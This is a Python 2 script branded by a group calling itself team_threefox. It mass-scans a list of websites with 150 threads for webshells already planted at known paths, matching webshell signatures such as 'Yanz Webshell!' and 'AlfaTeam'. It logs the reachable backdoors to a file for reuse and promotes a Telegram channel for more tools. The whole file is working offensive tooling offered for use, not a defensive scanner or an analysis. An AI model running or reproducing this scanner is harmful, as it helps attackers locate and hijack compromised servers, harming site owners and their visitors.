# -*-coding:Latin-1 -*
#@team_threefox
import sys , requests, re
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA


print(''' 
 _____ _                     ___         
/__   \ |__  _ __ ___  ___  / __\____  __
  / /\/ '_ \| '__/ _ \/ _ \/ _\/ _ \ \/ /
 / /  | | | | | |  __/  __/ / | (_) >  < 
 \/   |_| |_|_|  \___|\___\/   \___/_/\_\ 

        @team_threefox
[-Join our Telegram channel for exclusive tools.(https://t.me/team_threefox)-]
''')
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def Three_Fox(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/heh.php',headers=headers, allow_redirects=True,timeout=15)
        if '#!*&@#!*&@#' in check.content or 'Function putenv()' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('3FOX.txt', 'a').write(url + '/heh.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/NewFile.php',headers=headers, allow_redirects=True,verify=False ,timeout=40)
            if './AlfaTeam' in check.content or 'Lambo [Beta]' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('3FOX.txt', 'a').write(url + '/NewFile.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/view-more/ioxi.php',headers=headers, allow_redirects=True,timeout=15)
        if '| PHP 7.4.27 |' in check.content or '-rw-r--r--' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('3FOX.txt', 'a').write(url + '/wp-content/plugins/view-more/ioxi.php\n')
        else:
            url = 'https://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/erinyani/baxa1.php7',headers=headers, allow_redirects=True,timeout=15)
        if 'Yanz Webshell!' in check.content or '-rw-r--r--' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('3FOX.txt', 'a').write(url + '/wp-content/plugins/erinyani/baxa1.php7\n')
        else:
            url = 'https://' + URLdomain(url)
        check = requests.get(url+'/baxa1.php7',headers=headers, allow_redirects=True,timeout=15)
        if 'Yanz Webshell!' in check.content or '-rw-r--r--' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('3FOX.txt', 'a').write(url + '/baxa1.php7\n')
        else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
                url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/erinyani/baxa1.php',headers=headers, allow_redirects=True,timeout=15)
        if 'Yanz Webshell!' in check.content or '-rw-r--r--' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('3FOX.txt', 'a').write(url + '/wp-content/plugins/erinyani/baxa1.php\n')
        else:
            print ' -| ' + url + ' --> {}[Failed]'.format(fr)
            url = 'https://' + URLdomain(url)
        check = requests.get(url+'/baxa1.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
        if 'Yanz Webshell!' in check.content or '-rw-r--r--' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('3FOX.txt', 'a').write(url + '/baxa1.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/seoxx/randkeyword.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Yanz Webshell!' in check.content or '-rw-r--r--' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('3FOX.txt', 'a').write(url + '/wp-content/plugins/seoxx/randkeyword.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)

mp = Pool(150)
mp.map(Three_Fox, target)
mp.close()
mp.join()

print '\n [!] {}Saved in 3FOX.txt'.format(fc)